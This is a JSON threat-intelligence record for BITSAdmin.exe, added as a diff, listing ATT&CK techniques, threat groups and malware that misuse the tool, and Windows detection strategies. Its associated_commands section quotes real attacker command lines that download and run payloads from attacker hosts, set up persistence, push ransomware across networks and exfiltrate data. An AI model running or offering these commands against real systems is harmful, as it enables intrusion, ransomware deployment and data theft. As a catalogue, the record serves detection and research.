@@ -1,0 +1,1844 @@
+{
+  "type": "lolbin-details",
+  "version": 2,
+  "id": "e5f272be-0171-44a2-bac9-122c03b57570",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-08-17T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
+  "name": "BITSAdmin.exe",
+  "image": "bitsadmin.exe",
+  "description": "BITSAdmin is a command line tool used to create and manage BITS Jobs.",
+  "attack": {
+    "id": "S0190",
+    "name": "BITSAdmin",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0190",
+    "version": "20.0"
+  },
+  "summary": [
+    "Create BITS Jobs to launch a malicious process",
+    "Create BITS Jobs to upload files from a compromised host",
+    "Create BITS Jobs to upload and/or download files",
+    "Create BITS Jobs to upload and/or download files from SMB file servers"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\bitsadmin.exe",
+    "c:\\windows\\syswow64\\bitsadmin.exe"
+  ],
+  "hashes": {
+    "MD5": "01AAB62D5799F75B0D69EB29C1CA6855"
+  },
+  "capabilities": [
+    "Alternate data streams",
+    "Download",
+    "Copy",
+    "Execute",
+    "upload"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0010:Exfiltration:T1048.003",
+    "TA0011:Command and Control:T1105",
+    "TA0008:Lateral Movement:T1570",
+    "TA0005:Stealth:T1197",
+    "TA0003:Persistence:T1197",
+    "TA0002:Execution:T1197"
+  ],
+  "techniques": [
+    {
+      "id": "T1048.003",
+      "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "url": "https://attack.mitre.org/techniques/T1048/003",
+      "tactics": [
+        "Exfiltration"
+      ]
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "url": "https://attack.mitre.org/techniques/T1105",
+      "tactics": [
+        "Command and Control"
+      ]
+    },
+    {
+      "id": "T1570",
+      "name": "Lateral Tool Transfer",
+      "url": "https://attack.mitre.org/techniques/T1570",
+      "tactics": [
+        "Lateral Movement"
+      ]
+    },
+    {
+      "id": "T1197",
+      "name": "BITS Jobs",
+      "url": "https://attack.mitre.org/techniques/T1197",
+      "tactics": [
+        "Stealth",
+        "Persistence",
+        "Execution"
+      ]
+    }
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Daggerfly",
+        "attack_id": "G1034",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Ferocious Kitten",
+        "attack_id": "G0137",
+        "evidence": [
+          "uses S0190"
+        ]
+      },
+      {
+        "name": "HEXANE",
+        "attack_id": "G1001",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Leviathan",
+        "attack_id": "G0065",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Medusa Group",
+        "attack_id": "G1051",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "MirrorFace",
+        "attack_id": "G1054",
+        "evidence": [
+          "uses S0190"
+        ]
+      },
+      {
+        "name": "Storm-1811",
+        "attack_id": "G1046",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Tropic Trooper",
+        "attack_id": "G0081",
+        "evidence": [
+          "uses S0190"
+        ]
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": [
+          "uses S0190",
+          "names bitsadmin.exe"
+        ]
+      }
+    ],
+    "associated_campaigns": [],
+    "associated_malware": [
+      {
+        "name": "Astaroth",
+        "attack_id": "S0373",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Cobalt Strike",
+        "attack_id": "S0154",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Egregor",
+        "attack_id": "S0554",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "MarkiRAT",
+        "attack_id": "S0652",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "Remexi",
+        "attack_id": "S0375",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      },
+      {
+        "name": "UBoatRAT",
+        "attack_id": "S0333",
+        "evidence": [
+          "names bitsadmin.exe"
+        ]
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "attack_relationships": [
+      {
+        "source": "APT41",
+        "type": "intrusion-set",
+        "attack_id": "G0096",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "FireEye APT41 March 2020",
+            "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+          }
+        ]
+      },
+      {
+        "source": "APT41",
+        "type": "intrusion-set",
+        "attack_id": "G0096",
+        "description": "APT41 used BITSAdmin to download and install payloads.",
+        "citations": [
+          {
+            "source_name": "FireEye APT41 March 2020",
+            "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+          },
+          {
+            "source_name": "Crowdstrike GTR2020 Mar 2020",
+            "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Daggerfly",
+        "type": "intrusion-set",
+        "attack_id": "G1034",
+        "description": "Daggerfly has used BITSAdmin to retrieve files from remote locations to run on victim systems.",
+        "citations": [
+          {
+            "source_name": "Symantec Daggerfly 2023",
+            "url": "https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+          }
+        ]
+      },
+      {
+        "source": "Daggerfly",
+        "type": "intrusion-set",
+        "attack_id": "G1034",
+        "description": "Daggerfly has used PowerShell and BITSAdmin to retrieve follow-on payloads from external locations for execution on victim machines.",
+        "citations": [
+          {
+            "source_name": "Symantec Daggerfly 2023",
+            "url": "https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+          }
+        ]
+      },
+      {
+        "source": "Ferocious Kitten",
+        "type": "intrusion-set",
+        "attack_id": "G0137",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Kaspersky Ferocious Kitten Jun 2021",
+            "url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+          }
+        ]
+      },
+      {
+        "source": "HEXANE",
+        "type": "intrusion-set",
+        "attack_id": "G1001",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Kaspersky Lyceum October 2021",
+            "url": "https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+          }
+        ]
+      },
+      {
+        "source": "HEXANE",
+        "type": "intrusion-set",
+        "attack_id": "G1001",
+        "description": "HEXANE has used tools including BITSAdmin to test internet connectivity from compromised hosts.",
+        "citations": [
+          {
+            "source_name": "Kaspersky Lyceum October 2021",
+            "url": "https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Leviathan",
+        "type": "intrusion-set",
+        "attack_id": "G0065",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "FireEye Periscope March 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html"
+          }
+        ]
+      },
+      {
+        "source": "Leviathan",
+        "type": "intrusion-set",
+        "attack_id": "G0065",
+        "description": "Leviathan has used BITSAdmin to download additional tools.",
+        "citations": [
+          {
+            "source_name": "FireEye Periscope March 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html"
+          }
+        ]
+      },
+      {
+        "source": "Medusa Group",
+        "type": "intrusion-set",
+        "attack_id": "G1051",
+        "description": "Medusa Group has leveraged PowerShell for execution and defense evasion. Medusa Group has also utilized PowerShell to execute a bitsadmin transfer from file hosting site.",
+        "citations": [
+          {
+            "source_name": "Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024",
+            "url": "https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/"
+          },
+          {
+            "source_name": "Check Point Medusa Ransomware April 2025",
+            "url": "https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/medusa-ransomware-group/"
+          },
+          {
+            "source_name": "CISA Medusa Group Medusa Ransomware March 2025",
+            "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a"
+          },
+          {
+            "source_name": "Intel471 Medusa Ransomware May 2025",
+            "url": "https://www.intel471.com/blog/threat-hunting-case-study-medusa-ransomware"
+          }
+        ]
+      },
+      {
+        "source": "MirrorFace",
+        "type": "intrusion-set",
+        "attack_id": "G1054",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "JPCERT MirrorFace JUL 2024",
+            "url": "https://blogs.jpcert.or.jp/en/2024/07/mirrorface-attack-against-japanese-organisations.html"
+          }
+        ]
+      },
+      {
+        "source": "Storm-1811",
+        "type": "intrusion-set",
+        "attack_id": "G1046",
+        "description": "Storm-1811 has used BITSAdmin to download payloads.",
+        "citations": [
+          {
+            "source_name": "Microsoft Storm-1811 2024",
+            "url": "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/"
+          },
+          {
+            "source_name": "RedCanary June Insights 2024",
+            "url": "https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2024/"
+          }
+        ]
+      },
+      {
+        "source": "Storm-1811",
+        "type": "intrusion-set",
+        "attack_id": "G1046",
+        "description": "Storm-1811 has used scripted `cURL` commands, BITSAdmin, and other mechanisms to retrieve follow-on batch scripts and tools for execution on victim devices.",
+        "citations": [
+          {
+            "source_name": "Microsoft Storm-1811 2024",
+            "url": "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/"
+          },
+          {
+            "source_name": "RedCanary June Insights 2024",
+            "url": "https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2024/"
+          },
+          {
+            "source_name": "rapid7-email-bombing",
+            "url": "https://www.rapid7.com/blog/post/2024/05/10/ongoing-social-engineering-campaign-linked-to-black-basta-ransomware-operators"
+          }
+        ]
+      },
+      {
+        "source": "Tropic Trooper",
+        "type": "intrusion-set",
+        "attack_id": "G0081",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "TrendMicro Tropic Trooper Mar 2018",
+            "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
+          }
+        ]
+      },
+      {
+        "source": "Wizard Spider",
+        "type": "intrusion-set",
+        "attack_id": "G0102",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Mandiant FIN12 Oct 2021",
+            "url": "https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Wizard Spider",
+        "type": "intrusion-set",
+        "attack_id": "G0102",
+        "description": "Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.",
+        "citations": [
+          {
+            "source_name": "Mandiant FIN12 Oct 2021",
+            "url": "https://web.archive.org/web/20220313061955/https://www.mandiant.com/sites/default/files/2021-10/fin12-group-profile.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Astaroth",
+        "type": "malware",
+        "attack_id": "S0373",
+        "description": "Astaroth uses certutil and BITSAdmin to download additional malware.",
+        "citations": [
+          {
+            "source_name": "Cofense Astaroth Sept 2018",
+            "url": "https://web.archive.org/web/20200302071436/https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/"
+          },
+          {
+            "source_name": "Securelist Brazilian Banking Malware July 2020",
+            "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+          },
+          {
+            "source_name": "Cybereason Astaroth Feb 2019",
+            "url": "https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research"
+          }
+        ]
+      },
+      {
+        "source": "Cobalt Strike",
+        "type": "malware",
+        "attack_id": "S0154",
+        "description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.",
+        "citations": [
+          {
+            "source_name": "Talos Cobalt Strike September 2020",
+            "url": "https://web.archive.org/web/20210219195905/https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf"
+          },
+          {
+            "source_name": "Cobalt Strike Manual 4.3 November 2020",
+            "url": "https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf"
+          },
+          {
+            "source_name": "CobaltStrike Scripted Web Delivery",
+            "url": "https://www.cobaltstrike.com/help-scripted-web-delivery"
+          }
+        ]
+      },
+      {
+        "source": "Egregor",
+        "type": "malware",
+        "attack_id": "S0554",
+        "description": "Egregor has used BITSadmin to download and execute malicious DLLs.",
+        "citations": [
+          {
+            "source_name": "Intrinsec Egregor Nov 2020",
+            "url": "https://www.intrinsec.com/egregor-prolock/?cn-reloaded=1"
+          }
+        ]
+      },
+      {
+        "source": "MarkiRAT",
+        "type": "malware",
+        "attack_id": "S0652",
+        "description": "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.",
+        "citations": [
+          {
+            "source_name": "Kaspersky Ferocious Kitten Jun 2021",
+            "url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+          }
+        ]
+      },
+      {
+        "source": "Remexi",
+        "type": "malware",
+        "attack_id": "S0375",
+        "description": "Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.",
+        "citations": [
+          {
+            "source_name": "Securelist Remexi Jan 2019",
+            "url": "https://securelist.com/chafer-used-remexi-malware/89538/"
+          }
+        ]
+      },
+      {
+        "source": "Remexi",
+        "type": "malware",
+        "attack_id": "S0375",
+        "description": "Remexi uses BITSAdmin to communicate with the C2 server over HTTP.",
+        "citations": [
+          {
+            "source_name": "Securelist Remexi Jan 2019",
+            "url": "https://securelist.com/chafer-used-remexi-malware/89538/"
+          }
+        ]
+      },
+      {
+        "source": "UBoatRAT",
+        "type": "malware",
+        "attack_id": "S0333",
+        "description": "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.",
+        "citations": [
+          {
+            "source_name": "PaloAlto UBoatRAT Nov 2017",
+            "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
+          }
+        ]
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "cmd /c bitsadmin /transfer MyJob hxxps://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png C:\\Users\\Public\\11.png",
+        "intent": "Test the infected machine's internet connectivity by downloading a Google logo image.",
+        "status": "verified",
+        "source_name": "Kaspersky Lyceum October 2021",
+        "source_url": "https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+      },
+      {
+        "command": "cmd /c bitsadmin /transfer bbbb hxxp://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat",
+        "intent": "Download a batch file from APT41 infrastructure after exploiting ManageEngine Desktop Central; it installs a Cobalt Strike BEACON loader.",
+        "status": "verified",
+        "source_name": "FireEye APT41 March 2020",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cmd.exe %windir% /c explorer.exe & bitsadmin.exe /transfer /priority high hxxp://av.ka289cisce[.]org/rh72.bin %AppData%\\file.exe & %AppData%\\file.exe",
+        "intent": "Run by an LNK file embedded in a Word invoice lure: download rh72.bin with BITS at high priority, save it as file.exe in %AppData% and run it.",
+        "status": "verified",
+        "source_name": "NVISO LNK Bitsadmin Downloader March 2017",
+        "source_url": "https://blog.nviso.eu/2017/03/24/lnk-downloader-and-bitsadmin-exe-in-malicious-office-document/"
+      },
+      {
+        "command": "bitsadmin /create d1f2g34",
+        "intent": "Create a BITS job named d1f2g34 as the first step of the persistence that UBoatRAT sets up in init.bat.",
+        "status": "verified",
+        "source_name": "Palo Alto UBoatRAT November 2017",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/"
+      },
+      {
+        "command": "bitsadmin /addfile d1f2g34 c:\\windows\\system32\\net.exe  %temp%\\sys.log",
+        "intent": "Add the local file net.exe to the job to be transferred to %temp%\\sys.log, so BITS has a copy to complete.",
+        "status": "verified",
+        "source_name": "Palo Alto UBoatRAT November 2017",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/"
+      },
+      {
+        "command": "bitsadmin /SetNotifyCmdLine d1f2g34 \"c:\\programdata\\svchost.exe\" \"\"",
+        "intent": "Set BITS to run the UBoatRAT copy c:\\programdata\\svchost.exe when the job finishes or errors, so the malware keeps running after a reboot.",
+        "status": "verified",
+        "source_name": "Palo Alto UBoatRAT November 2017",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/"
+      },
+      {
+        "command": "bitsadmin /Resume d1f2g34",
+        "intent": "Resume the job so BITS keeps executing the malware periodically, even after the computer reboots.",
+        "status": "verified",
+        "source_name": "Palo Alto UBoatRAT November 2017",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/"
+      },
+      {
+        "command": "bitsadmin /cancel pdj",
+        "intent": "First of five bitsadmin commands that the LOK implant uses to issue an additional beacon to the C2 server; it cancels any existing BITS job named pdj.",
+        "status": "verified",
+        "source_name": "Kaspersky Ferocious Kitten June 2021",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "command": "bitsadmin /create pdj",
+        "intent": "Create the BITS job pdj, part of the sequence used to issue an additional beacon to the C2 server.",
+        "status": "verified",
+        "source_name": "Kaspersky Ferocious Kitten June 2021",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "command": "bitsadmin /SetPriority pdj HIGH",
+        "intent": "Set the pdj job to high priority, part of the sequence used to issue an additional beacon to the C2 server.",
+        "status": "verified",
+        "source_name": "Kaspersky Ferocious Kitten June 2021",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "command": "bitsadmin /addfile pdj \"hxxp://[C2 address]/i.php?u=[computername]-[username]&i=[proxy ip]\" %PUBLIC%\\AppData\\Libs\\p.b",
+        "intent": "Add the C2 URL carrying the computer name, user name and proxy IP to the job; Kaspersky says its purpose is not entirely clear but is probably to bypass a proxy in the victim network and give the C2 the victim's IP.",
+        "status": "verified",
+        "source_name": "Kaspersky Ferocious Kitten June 2021",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "command": "bitsadmin /resume pdj",
+        "intent": "Resume the pdj job so the beacon is sent, the last command of the sequence used to issue an additional beacon to the C2 server.",
+        "status": "verified",
+        "source_name": "Kaspersky Ferocious Kitten June 2021",
+        "source_url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "command": "bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal \"/YP01__\" \"\"",
+        "intent": "Upload (exfiltrate) data collected on the victim to the C2 server through a BITS upload job.",
+        "status": "verified",
+        "source_name": "Kaspersky Remexi January 2019",
+        "source_url": "https://securelist.com/chafer-used-remexi-malware/89538/"
+      },
+      {
+        "command": "bitsadmin /transfer d7d3 hxxps://download.anydesk[.]com/AnyDesk.exe CSIDL_COMMON_APPDATA\\anydesk.exe",
+        "intent": "Download the legitimate AnyDesk executable onto a victim machine as a remote desktop access tool.",
+        "status": "verified",
+        "source_name": "Symantec Daggerfly April 2023",
+        "source_url": "https://www.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+      },
+      {
+        "command": "C:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe",
+        "intent": "Deploy the Sodinokibi ransomware executable from the domain controller to remote systems.",
+        "status": "verified",
+        "source_name": "The DFIR Report Sodinokibi March 2021",
+        "source_url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/"
+      },
+      {
+        "command": "wmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\"",
+        "intent": "Use WMI to run bitsadmin on remote hosts listed in a file, transferring the ransomware executable from a share and running it (lateral movement).",
+        "status": "verified",
+        "source_name": "Symantec Hive Conti AvosLocker April 2022",
+        "source_url": "https://www.security.com/threat-intelligence/ransomware-hive-conti-avoslocker"
+      },
+      {
+        "command": "bitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll",
+        "intent": "Use BITSAdmin to download a DLL over HTTP during lateral movement and ransomware execution.",
+        "status": "verified",
+        "source_name": "Symantec Hive Conti AvosLocker April 2022",
+        "source_url": "https://www.security.com/threat-intelligence/ransomware-hive-conti-avoslocker"
+      },
+      {
+        "command": "c:\\windows\\system32\\bitsadmin.exe /transfer conhost /download /priority FOREGROUND hxxps://transfer[.]sh/get/HcrhQuN0YC/temp3[.]exe c:\\programdata\\sc.exe'",
+        "intent": "Download and execute another ScreenConnect client after compromising domain controllers through the ScreenConnect vulnerabilities.",
+        "status": "verified",
+        "source_name": "Trend Micro ScreenConnect Exploitation February 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
+      },
+      {
+        "command": "bitsadmin /transfer indirme  /download /priority normal hxxp://195.66.214[.]79/pci.exe c:\\users\\[User Name]\\Videos\\pci.exe",
+        "intent": "Download the pci.exe payload from the attacker's server to a user's Videos folder on a compromised MS-SQL server.",
+        "status": "verified",
+        "source_name": "AhnLab ASEC Windows Database Servers Q4 2025",
+        "source_url": "https://asec.ahnlab.com/en/92003/"
+      },
+      {
+        "command": "ping 127.0.0.1 -n 3>null&bitsadmin /transfer myjob /download /priority high hxxp://ads.metrofamilyzine[.]com/ef9a0c52/7e4ccb5.bin \"%APPDATA%\\27dgdte72.exe\">nul&start %APPDATA%\\27dgdte72.exe",
+        "intent": "Download the payload with BITS from a malicious Word macro, save it as 27dgdte72.exe in %APPDATA% and start it.",
+        "status": "verified",
+        "source_name": "SANS ISC BITS Used to Download Payloads May 2016",
+        "source_url": "https://isc.sans.edu/diary/21027"
+      },
+      {
+        "command": "C:\\Windows\\System32\\bitsadmin.exe /rawreturn /transfer getfile hxxp://89[.]34[.]111[.]11/3.avi c:\\Users\\public\\2.bat",
+        "intent": "Download a script disguised as 3.avi and save it as 2.bat, which is then run (cmd /c) to retrieve the Opera browser, malicious DLLs and Cobalt Strike.",
+        "status": "verified",
+        "source_name": "Rapid7 Exchange Post-Exploitation March 2021",
+        "source_url": "https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"
+      },
+      {
+        "command": "bitsadmin /transfer n hxxp://185.173.92[.]141:33579/i610.exe c:\\users\\public\\wget.exe",
+        "intent": "Download a tool saved as wget.exe in c:\\users\\public from attacker infrastructure onto a compromised machine; the report uses the server address as a link to other infrastructure.",
+        "status": "verified",
+        "source_name": "Trend Micro DRBControl February 2020",
+        "source_url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "command": "bitsadmin /transfer n hxxp://185.173.92[.]141:33579/t32d.exe c:\\users\\public\\wget.exe",
+        "intent": "Download a tool saved as wget.exe in c:\\users\\public from attacker infrastructure onto a compromised machine; the report uses the server address as a link to other infrastructure.",
+        "status": "verified",
+        "source_name": "Trend Micro DRBControl February 2020",
+        "source_url": "https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "command": "start wmic /node:@C:\\share$\\comps1.txt /user:[REDACTED] /password:[REDACTED] process call create \"cmd.exe /c bitsadmin /transfer vVv \\\\[REDACTED]\\share$\\vVv.exe %APPDATA%\\vVv.exe & %APPDATA%\\vVv.exe\"",
+        "intent": "Use WMIC to run bitsadmin on hosts listed in comps1.txt, transferring the RYUK ransomware executable from a share to %APPDATA% and running it.",
+        "status": "verified",
+        "source_name": "Mandiant KEGTAP SINGLEMALT Ransomware October 2020",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser"
+      }
+    ]
+  },
+  "detections": {
+    "event_ids": {
+      "WinEventLog:PowerShell": [
+        {
+          "event_id": 4103,
+          "data_components": [
+            "Command Execution"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        },
+        {
+          "event_id": 4104,
+          "data_components": [
+            "Command Execution"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        },
+        {
+          "event_id": 4105,
+          "data_components": [
+            "Command Execution"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        },
+        {
+          "event_id": 4106,
+          "data_components": [
+            "Command Execution"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        }
+      ],
+      "WinEventLog:Security": [
+        {
+          "event_id": 4656,
+          "data_components": [
+            "File Access"
+          ],
+          "techniques": [
+            "T1048.003"
+          ]
+        },
+        {
+          "event_id": 4663,
+          "data_components": [
+            "File Access"
+          ],
+          "techniques": [
+            "T1048.003"
+          ]
+        },
+        {
+          "event_id": 4670,
+          "data_components": [
+            "File Access"
+          ],
+          "techniques": [
+            "T1048.003"
+          ]
+        },
+        {
+          "event_id": 4688,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        },
+        {
+          "event_id": 5140,
+          "data_components": [
+            "Network Share Access"
+          ],
+          "techniques": [
+            "T1570"
+          ]
+        }
+      ],
+      "WinEventLog:Sysmon": [
+        {
+          "event_id": 1,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1048.003",
+            "T1105",
+            "T1570"
+          ]
+        },
+        {
+          "event_id": 3,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1048.003",
+            "T1105",
+            "T1197"
+          ]
+        },
+        {
+          "event_id": 11,
+          "data_components": [
+            "File Creation"
+          ],
+          "techniques": [
+            "T1105",
+            "T1570"
+          ]
+        },
+        {
+          "event_id": 22,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1048.003",
+            "T1105",
+            "T1197"
+          ]
+        }
+      ],
+      "WinEventLog:System": [
+        {
+          "event_id": 7036,
+          "data_components": [
+            "Service Creation"
+          ],
+          "techniques": [
+            "T1197"
+          ]
+        }
+      ]
+    },
+    "other_log_sources": [
+      {
+        "log": "NSM:Flow",
+        "channel": "http.log, ftp.log",
+        "data_component": "Network Traffic Content",
+        "technique": "T1048.003"
+      }
+    ],
+    "attack_detection_strategies": [
+      {
+        "technique": "T1048.003",
+        "id": "DET0149",
+        "name": "Detection of Exfiltration Over Unencrypted Non-C2 Protocol",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0149",
+        "analytics": [
+          {
+            "id": "AN0423",
+            "description": "Detects data access or staging events followed by outbound data flows using unencrypted protocols (e.g., FTP, HTTP) initiated by unexpected processes or to rare destinations.",
+            "log_sources": [
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              },
+              {
+                "data_component": "File Access",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4663, 4670, 4656"
+              },
+              {
+                "data_component": "Network Traffic Content",
+                "name": "NSM:Flow",
+                "channel": "http.log, ftp.log"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1105",
+        "id": "DET0060",
+        "name": "Detect Ingress Tool Transfers via Behavioral Chain",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0060",
+        "analytics": [
+          {
+            "id": "AN0165",
+            "description": "Unusual or uncommon processes initiate network connections to external destinations followed by file creation (tools downloaded).",
+            "log_sources": [
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              },
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1570",
+        "id": "DET0183",
+        "name": "Detection Strategy for Lateral Tool Transfer across OS platforms",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0183",
+        "analytics": [
+          {
+            "id": "AN0516",
+            "description": "Correlate suspicious file transfers over SMB or Admin$ shares with process creation events (e.g., cmd.exe, powershell.exe, certutil.exe) that do not align with normal administrative behavior. Detect remote file writes followed by execution of transferred binaries.",
+            "log_sources": [
+              {
+                "data_component": "Network Share Access",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=5140"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              },
+              {
